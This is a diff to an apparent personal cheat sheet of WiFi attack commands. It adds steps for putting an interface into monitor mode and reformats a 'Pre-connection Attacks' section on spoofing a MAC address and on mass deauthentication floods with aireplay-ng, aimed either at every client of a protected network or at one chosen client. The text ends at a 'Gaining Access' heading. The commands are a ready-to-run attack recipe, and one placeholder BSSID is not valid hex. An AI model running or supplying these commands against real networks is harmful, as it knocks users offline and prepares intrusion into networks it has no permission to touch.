@@ -1,17 +1,27 @@
+Enabling monitor mode
+----------------------
+iwconfig
+airmon-ng check kill  
+airmon-ng start wlan1 
+airodump-ng wlan1mon 
+
 Pre-connection Attacks
 -----------------------
-mac changing
-ifconfig wlan0 down
-ifconfig wlan0 hw ether 00:ff:ff:ff:44:55
-ifconfig wlan0 up
-ifconfig wlan0
+    mac changing
+    ............
+    ifconfig wlan0 down
+    ifconfig wlan0 hw ether 00:ff:ff:ff:44:55
+    ifconfig wlan0 up
+    ifconfig wlan0
 
-Deauthenticating All Clients From Protected WiFi Network
-airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
-aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0
+    Deauthenticating All Clients From Protected WiFi Network
+    ........................................................
+    airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
+    aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0
 
-Deauthenticating a Client From Protected WiFi Networks
-aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0
+    Deauthenticating a Client From Protected WiFi Networks
+    ......................................................
+    aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0
 
 Gaining Access
 ---------------
